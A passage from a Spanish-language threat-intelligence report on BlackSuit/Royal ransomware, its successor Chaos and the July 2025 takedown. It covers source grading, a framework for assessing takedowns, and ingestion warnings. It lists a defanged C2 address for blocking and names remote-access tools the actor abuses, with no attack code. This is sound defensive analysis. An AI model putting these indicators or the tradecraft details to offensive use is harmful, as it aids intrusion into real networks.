| **`B-1` — FBI y CISA, `#StopRansomware: BlackSuit (Royal) Ransomware`, aviso conjunto `AA23-061A`**, publicado el 2023-03-02 y revisado cuatro veces (2023-11-13, 2024-08-07, 2024-08-14, 2024-08-27) — **leído en original** | GOVINT · aviso conjunto con indicadores de respuesta a incidentes del FBI | **A** | **1** | **Fuente primaria del predecesor, y la mejor del expediente.** Establece el linaje Royal → BlackSuit, las cifras de rescate —1 a 10 millones, más de 500 millones en total, máximo individual de 60 millones—, el reparto de vectores iniciales con porcentaje para RDP, el conjunto de herramientas completo, el mecanismo de **cifrado parcial con porcentaje elegible** del que sale `KJ-4`, y la nota del **aumento de comunicaciones telefónicas** de la que sale `KJ-5`. Publica **tres paquetes STIX** (`G-4`). **Y hace algo que merece subrayarse: advierte contra el uso de sus propios indicadores** —«recomendamos examinar o investigar estas direcciones IP antes de emprender acciones a futuro, como el bloqueo»—, que es exactamente la disciplina que la portada de este repositorio predica y que casi ninguna fuente practica. Sesgos: una acusación de lo que se pudo documentar en respuesta a incidentes, de modo que la **victimología es un mínimo**; y los datos más recientes son de **julio de 2024** |
| **`B-2` — Cisco Talos Incident Response, «Unmasking the new Chaos RaaS group attacks», 2025-07-24** (Anna Bennett, James Nutland, Chetan Raghuprasad) — **leído en original** | OSINT comercial · TECHINT de primera mano, de respuesta a incidentes y de análisis del cifrador | **B** | **2** | **Fuente primaria del sucesor, y de calidad alta.** Publica las órdenes de descubrimiento una por una, la línea de órdenes completa del túnel de SSH y del cifrador, la orden de exfiltración con su filtro y sus veinte exclusiones, la clave XOR de la nota, el esquema criptográfico, las listas de exclusión de cifrado, **y la lista de exclusiones de victimología que el propio actor publica**. Y declara con cuidado tres cosas: su **confianza moderada** en el vínculo con BlackSuit, que el grupo **no tiene relación** con el constructor homónimo, y que el actor **usa el nombre para crear confusión**. Sesgos: es el blog de un proveedor y la pieza describe su propio servicio de respuesta a incidentes; **la publicación coincide en fecha con la incautación**, lo que no parece coordinado y conviene no sobreinterpretar |
| **`B-3` — Cobertura de `Operation Checkmate`** (SC World, SecurityWeek, Infosecurity, Cybernews, Hackread, TechRadar, ITPro) — **leída en original** | OSINT · prensa especializada derivada | **C** | **3** | **Única vía disponible para los hechos de la acción policial** (`G-2`). Consistente entre siete medios en la fecha (2025-07-24), el nombre, los participantes —Departamento de Justicia y dieciséis agencias de nueve países, bajo el grupo conjunto de Europol—, el alcance incautado —cuatro servidores, nueve dominios, más de un millón de dólares— y, de forma destacada, **la ausencia de detenciones y la ausencia de comunicado oficial detallado, que varias señalan expresamente**. Se usa para los hechos, no para interpretación |
| **`B-4` — Perfiles de actor de terceros** (un perfil de Royal/BlackSuit, una ficha de grupo de Halcyon, un rastreador de operaciones) | OSINT · compilación derivada | **C** | **4** | Se usan para dos cosas, las dos con cautela. Primera: sostener el eslabón **Conti → Royal**, que **el aviso oficial no afirma** y que por tanto se marca como de proveedor (§3.5, punto 2). Segunda: la observación de que **no se ha documentado actividad independiente de BlackSuit desde el primer trimestre de 2025**, que refuerza `KJ-3`. **Los recuentos de víctimas de estos rastreadores son inconsistentes entre sí** —una misma ficha da 76 y 103— y **no se usa ninguno** |
| **`B-5` — Consultas propias de RDAP al registro regional de direcciones**, 2026-11-19 | Verificación propia · técnica | **A** | **1** | **Base de `A.5`, y la parte más verificable de este informe.** Seis consultas al servicio RDAP de LACNIC, que devuelven el bloque y la entidad registrante de cada dirección. Ninguna requirió interacción con infraestructura del adversario. **Límite declarado**: establece a quién está asignado el bloque, **no quién usaba la dirección** |

> **Una observación sobre la estructura de fuentes, y es favorable con una
> salvedad.** Las dos fuentes primarias son de la mejor clase disponible para
> sus objetos respectivos: un aviso conjunto gubernamental con indicadores de
> respuesta a incidentes del FBI para el predecesor, y un análisis de
> respuesta a incidentes con el cifrador desmontado para el sucesor. **Los dos
> declaran sus límites** —el primero advierte contra sus propios indicadores,
> el segundo declara confianza moderada en su atribución— y eso es lo que
> permite construir sobre ellos.
>
> **La salvedad está en el medio del expediente**, y es `G-2`: **el hecho
> central del informe —la acción policial— es el peor documentado de los
> tres**. No hay comunicado oficial detallado, las cifras vienen de siete
> medios que se citan unos a otros, y la afirmación más consecuente de todas
> —**que no hubo detenciones**— es la que menos respaldo documental tiene,
> por la razón obvia de que es una ausencia. Si mañana se publica que sí
> hubo detenciones no anunciadas, `E-1` cambia de sentido. Es el punto más
> frágil del informe y está en el pre-mortem y en `I-1`.

## Anexo C — Léxico de probabilidad y confianza

<!-- cti:bars title="Probabilidad estimativa — cuán probable es que el hecho sea cierto" -->

| Etiqueta | Valor |
|---|---|
| Casi con certeza (≥99 %) | 99 |
| Muy probable (80–95 %) | 88 |
| Probable (55–80 %) | 68 |
| Aproximadamente igual de probable (40–60 %) | 50 |
| Poco probable (20–45 %) | 32 |
| Muy poco probable (5–20 %) | 12 |
| Remoto (≤5 %) | 4 |

**Confianza** (en la *base* del juicio, no en su probabilidad): **alta** —fuentes múltiples, corroboradas, con método expuesto—; **moderada** —fuente única de calidad, o inferencia propia sobre datos verificables—; **baja** —dato ausente, o inferencia sobre indicios indirectos—.

> **Y una aplicación concreta de la regla de no superar la confianza de la
> fuente, porque este informe estuvo tentado de romperla.** `KJ-4` identifica
> el mecanismo que hace auditable la valoración de Talos, y es tentador
> concluir que con el mecanismo identificado la valoración debería subir de
> *moderada* a *alta*. **No sube.** Lo que `KJ-4` hace es convertir una
> afirmación que había que aceptar en una que se puede comprobar o romper —lo
> cual vale mucho— y eso no es lo mismo que añadir evidencia. La
> correspondencia del porcentaje de cifrado es nuestra lectura de dos
> documentos, no un dato nuevo; y la fuente que tenía las muestras delante
> declaró *moderada*. **Un informe derivado puede bajar la confianza de su
> origen si encuentra motivos; no puede subirla por haberlo entendido mejor.**
> Es la misma regla que `CTI-2026-038` enunció, aplicada aquí en el caso en
> que más cuesta.

## Anexo D — Cómo evaluar una desarticulación

**El problema.** Se publica una acción policial contra una operación criminal y hay que decidir qué cambia. La respuesta por omisión en la práctica es bajar la prioridad del expediente, y esta cartera tiene ahora **tres casos que indican que ésa es la respuesta equivocada**.

**La observación de partida.** Una desarticulación no actúa sobre «una operación»: actúa sobre **activos concretos**, y una operación criminal está hecha de activos con tiempos de reemplazo muy distintos. Confundir «se incautó infraestructura» con «se detuvo la operación» es el error, y se evita con una tabla.

**Paso 1 — Clasificar lo incautado por tiempo de reemplazo.**

| Activo | Tiempo de reemplazo | ¿Se incautó aquí? |
|---|---|---|
| **Operadores** | **No reemplazable.** Es el activo que define la operación: conocimiento, relaciones, capacidad de ingeniería social en un idioma | **No** |
| **Reputación de marca** y historial del sitio de filtración | **Meses.** Es lo que hace creíble la amenaza de publicación, y no se puede comprar | **Sí** |
| **Accesos vigentes en redes de víctimas** | **No reemplazable sin volver a entrar** | **No** |
| **Fondos ya obtenidos** | **No recuperable.** Es la única pérdida definitiva | **Sí**, más de un millón de dólares |
| **Relaciones con afiliados** | Semanas, y con fricción | **No** |
| **Código del cifrador y herramientas** | **Cero.** Están en los equipos de los operadores | **No** |
| **Infraestructura de publicación y de negociación** | **Días** | **Sí** |
| **Dominios y servidores** | **Días** | **Sí** |

**Paso 2 — Leer la tabla.** Si lo incautado está sólo en las filas de días, la operación continúa con una molestia administrativa. Si alcanza las filas de meses, hay degradación real. Si alcanza las de «no reemplazable», hay fin de operación. **En este caso se alcanzaron una fila de meses y una de pérdida definitiva, y ninguna de las tres de «no reemplazable».**

**Paso 3 — Buscar el sucesor en el pasado, no en el futuro.** Es la parte contraintuitiva y la que los tres casos de esta cartera justifican:

| Caso | Intervención | Reemplazo en marcha desde | Diferencia |
|---|---|---|---|
| `CTI-2026-036` · red de bots | 2024-01 | 2023-11 | **−2 meses** |
| **Este informe** · extorsión | 2025-07 | 2025-02 | **−5 meses** |
| `CTI-2026-037` · secuestro de DNS | 2026-04 | *(sin documentar)*, pero el linaje de desarrollo del mismo actor sobrevivió a una desarticulación anterior en 2024 | — |

**El modelo implícito en «¿hubo reaparición?» es falso.** No hay caída, reconstrucción y resurgimiento —con una ventana de respiro en medio—. Hay **solapamiento**: la operación sucesora se monta mientras la anterior todavía produce ingresos, porque montarla cuesta tiempo y nadie quiere pasar ese tiempo sin ingresar. La intervención, cuando llega, **acelera un traslado que ya estaba hecho**.

**La consecuencia operativa:** el día de una desarticulación es el mejor día para **buscar al sucesor**, y hay que buscarlo **hacia atrás**. Donde mirar:

| Dónde | Qué buscar | Por qué funciona |
|---|---|---|
| **Foros de reclutamiento de afiliados** | Anuncios de programas nuevos en los **seis meses previos** a la intervención | Un programa nuevo tiene que reclutar, y reclutar es público |
| **Fechas de compilación de muestras nuevas** | Familias no atribuidas cuyas muestras se compilaron **antes** de la intervención | Aquí: muestras de febrero, marzo y mayo de 2025, con la intervención en julio |
| **Continuidad de mecanismo**, no de código | Decisiones de **diseño de interfaz del operador** —qué parámetros acepta, qué valores por omisión— más que funciones o cadenas | Es `KJ-4`: el porcentaje de cifrado como parámetro con valor por omisión. **Un operador reescribe el código y conserva su forma de trabajar** |
| **Continuidad de conducta**, no de herramienta | Cómo contacta con la víctima, cómo negocia, qué amenaza | Es `KJ-5`: del teléfono para cobrar al teléfono para entrar. **Es un recurso humano, y no se pierde en una incautación** |
| **Estructura de la nota de rescate** | Formato, tono, qué incluye y qué omite | Talos la cita como una de sus tres similitudes. **No tiene función técnica, y por eso nadie la rota** |
| **Lista de exclusiones declarada** | Países, sectores | Es una decisión de política de marca que suele viajar con las personas |

**Paso 4 — Reevaluar qué detecciones siguen valiendo, y es casi todo.** Si el sucesor comparte mecanismo, conducta, herramientas y nota, **las detecciones del predecesor siguen sirviendo en buena medida**, y las que no sirven son exactamente las que menos valían: hashes y direcciones. Lo que hay que revisar es si alguna detección estaba atada a un nombre, a un dominio o a una extensión de fichero, porque ésas sí caducan con la marca.

**Paso 5 — Y limpiar los indicadores del predecesor de las listas de bloqueo.** Es el paso que nadie hace y el que tiene coste inmediato. Los indicadores de una operación desarticulada **siguen publicados en avisos vigentes**, y su valor preventivo es cero mientras su coste de falso positivo sigue siendo el mismo o peor: la infraestructura comprometida se devuelve a sus dueños, los equipos se limpian, y las direcciones vuelven a ser lo que eran. **En este expediente, seis de las setenta y una direcciones son banda ancha de operadores de la región** (`A.5`, `H-10`).

**Lo que hay que declarar sobre este marco.** Tres cosas:

- **Tres casos no son una ley.** El patrón del paso 3 es consistente en los tres expedientes de esta cartera y no se ha verificado contra una muestra amplia. Es una hipótesis de trabajo, no un hallazgo estadístico, y el `Anexo H` pide contraejemplos.
- **Hay desarticulaciones que sí terminan operaciones**, y este marco debe poder reconocerlas: las que alcanzan la fila de **operadores**, es decir, las que incluyen detenciones. La ausencia de detenciones es, en este marco, **el dato más importante de una nota de prensa**, y suele ser el que menos atención recibe.
- **Y el marco no dice que las acciones policiales no sirvan.** Dice que sirven para lo que sirven: incautar fondos irrecuperables, destruir reputación de marca, imponer costes de fricción y —en los casos con detenciones— terminar operaciones. Lo que no hacen es abrir una ventana de respiro para el defensor, y planificar como si la abrieran es el error que este anexo intenta evitar.

## Anexo E — Marcos de referencia empleados

- **ICD 203** (*Analytic Standards*), para el léxico de probabilidad y la separación de los ejes de probabilidad y confianza (Anexo C), **con la regla de no superar la confianza declarada por la fuente** aplicada expresamente en el caso de `KJ-4`.
- **Código Admiralty/OTAN**, doble valoración de fuente e información (Anexo B).
- **Grado de establecimiento** —oficial, proveedor, propio— con la fecha de la actividad separada de la de publicación, propuesto en `CTI-2026-039` y aplicado aquí en `O-2.1`.
- **MITRE ATT&CK v18** (`T-2`), con marcado de qué técnicas aparecen en los **dos** expedientes, que es la base técnica del vínculo.
- **Pirámide del Dolor** (Bianco), en `T-3`, con la observación de que en este expediente **el valor de la capa de direcciones IP es negativo** si se ingiere sin filtrar.
- **Análisis de Hipótesis Competidoras (ACH)** y **pre-mortem**, en `O-6`.
- **Verificación propia de registro por RDAP**, en `A.5`.
- **Localización del mecanismo concreto detrás de una similitud declarada pero no detallada por una fuente**, propia de este informe (`KJ-4`, `O-2.2`).
- **Marco de evaluación de una desarticulación**, propio de este informe (`Anexo D`), con su clasificación de activos por tiempo de reemplazo y su regla de buscar al sucesor hacia atrás.

## Anexo F — Paquete legible por máquina

Las tablas `cti:ioc` de este anexo alimentan `ioc_index.csv`. **Cinco advertencias de ingesta, y la primera es la más importante de todo el repositorio:**

1. **Las seis direcciones de `A.5` llevan tipo `artefacto` y no `ipv4`**, de modo que **no entran en `ioc_ipv4.txt`**. Cinco son rangos de banda ancha de UNE EPM, Telmex Colombia, Telecom Argentina y NODOSUD, verificado por RDAP el 2026-11-19; la sexta es un proveedor de alojamiento y su tratamiento es una decisión de política. **El propio aviso oficial del que provienen pide investigarlas antes de bloquear**, y la operación a la que pertenecían está desarticulada desde julio de 2025: su valor preventivo es nulo y su coste de falso positivo es un corte de tráfico legítimo de la región.
2. **Las entradas de `A.6` llevan tipo `herramienta`** y no entran en ningún agregado. Son `Quick Assist` —que viene con Windows—, cinco productos de administración remota, `GoodSync`, el cliente `OpenSSH` del sistema e `Impacket`. **En organizaciones que subcontratan soporte, alguno de los cinco productos ES la herramienta del proveedor.**
3. **Los indicadores de mayor valor de este informe no son ingeribles**, y conviene decirlo: son el patrón de `A.1` —`Quick Assist` tras una llamada, y la desinstalación de un control de seguridad— y los artefactos de anfitrión de `A.2`. Un consumidor que mida este informe por filas ingeribles concluirá que aporta poco.
4. **Las entradas de `A.7` llevan tipo `artefacto` y `cartera`**: son material de atribución y de contexto, incluido el parámetro en portugués y la lista de exclusiones del adversario.
5. **Y la dirección de `A.3` sí es `ipv4`** y sí entra en los agregados: `45.61.134[.]36` es el servidor de mando y control del sucesor, no un tercero comprometido, y bloquearla no tiene coste conocido.

**El aviso oficial publica tres paquetes STIX** —de marzo y noviembre de 2023 y de agosto de 2024—, que son **la fuente preferente para ingesta** y permitirían poblar este anexo sin transcribir nada a mano. **No se procesaron**: es `G-4`, es la brecha más rentable de la lista, **y hay que procesarlos aplicando antes el filtro de `A.5`**, porque las seis direcciones están dentro.

## Anexo G — Control de cambios

| Versión | Fecha | Cambio | Autor |
|---|---|---|---|
| 1.0 | 2026-11-19 | Emisión inicial. Incluye: la respuesta a la pregunta del requisito —no hubo reaparición porque **el sucesor llevaba cinco meses operando** cuando cayó el predecesor— y el marco general que se sigue (`KJ-3`, `E-1`, `Anexo D`); **la localización del mecanismo concreto que hace auditable el vínculo** entre las dos generaciones, el cifrado parcial con porcentaje elegible por el operador, que la fuente cita sin detallar (`KJ-4`, `O-2.2`); la continuidad de conducta del teléfono, del cobro a la entrada (`KJ-5`); la **lista de exclusiones declarada por el propio adversario** y cómo leerla sin creerla ni descartarla, con la asimetría de que cubre a Brasil y a ningún otro país de la región (`KJ-6`, `E-4`); el **hallazgo propio del parámetro en portugués** del cifrador (`KJ-9`); el análisis del vector inicial como un control que **no es técnico y no tiene dueño en Seguridad** (`E-2`, `X-5.1`); y la **verificación propia por RDAP de seis direcciones del aviso oficial que pertenecen a operadores de banda ancha latinoamericanos y no deben bloquearse** (`KJ-7`, `A.5`, `H-10`) | Célula CTI |

## Anexo H — Realimentación del consumidor

Este informe sostiene una inferencia propia sobre el vínculo entre dos generaciones, propone un marco para evaluar desarticulaciones que ninguna fuente publica, y saca seis direcciones de un aviso gubernamental de los agregados de este repositorio. Las tres cosas se pueden atacar.

1. **¿Se rompe `KJ-4`?** Es la pieza propia más atacable y **se puede comprobar en quince minutos leyendo dos documentos públicos**: el aviso `AA23-061A` describe el cifrado parcial con porcentaje elegible como «enfoque único», y el análisis de Talos documenta `/encrypt_step` con 30 % por omisión. Si alguien conoce otra familia que exponga el porcentaje como parámetro del operador con valor por omisión, la correspondencia pierde fuerza y conviene saberlo.
2. **¿Están las seis direcciones de `A.5` en alguna lista de bloqueo nuestra?** Es `G-7` y `H-10`, **es la primera consulta que hay que ejecutar**, y no busca al adversario: busca un corte autoinfligido en curso contra clientes de Tigo, Claro y Telecom Argentina.
3. **¿Existe la regla de la mesa de ayuda?** Es `G-6`, se responde con una pregunta, y es **la única medida que corta el vector inicial del sucesor**. Si la respuesta es que no hay regla, ése es el hallazgo del informe en esa organización.
4. **¿Hay contraejemplos del patrón del `Anexo D`?** Tres casos no son una ley. **Lo más útil que alguien puede aportar es una desarticulación en la que el sucesor apareciera DESPUÉS**, porque eso acotaría el marco en lugar de confirmarlo. Y, en particular: ¿hay desarticulaciones **con detenciones** cuyo resultado fuera distinto? El marco predice que sí, y no lo ha comprobado.
5. **¿Hubo detenciones no anunciadas?** Es `G-3` y es el punto más frágil del informe: la afirmación más consecuente —que no hubo detenciones— es una ausencia, y las ausencias son débiles. Si las hubo, `E-1` cambia de sentido.
6. **¿Alguien puede procesar los tres paquetes STIX del aviso oficial?** Es `G-4`, es la brecha más rentable, y permitiría poblar el Anexo A sin transcribir a mano — **aplicando antes el filtro de `A.5`**.
7. **¿Aparece el parámetro en portugués en otras muestras?** Es `KJ-9` y `G-5`. Una segunda aparición lo convertiría de curiosidad en indicio. Y conviene repetir lo que **no** significa: identifica el idioma de quien escribió una línea de código, no la nacionalidad de nadie.
8. **A Dirección: ¿cuántos anfitriones y cuántos recursos compartidos alcanzaría un cifrador que enumere su propia subred?** Es `G-8` y es la única pregunta de este informe cuya respuesta **determina el coste de un incidente en lugar de su probabilidad**. No es una pregunta de seguridad: es de arquitectura de red, y su respuesta decide si `X-5.4` es un proyecto o una revisión.
9. **¿Se ha leído la lista de exclusiones como una garantía?** Cubre a **Brasil y a ningún otro país de la región**, es declaración del adversario, y en un modelo de afiliados la marca sólo puede imponerla expulsando, es decir, **después del ataque**.
10. **¿Se bajó la prioridad de este expediente por la desarticulación?** Es el riesgo 2 del pre-mortem y el error que el propio requisito invitaba a cometer. El día de una acción policial es un buen día para buscar al sucesor.

*Fin del informe `CTI-2026-040` v1.0.*
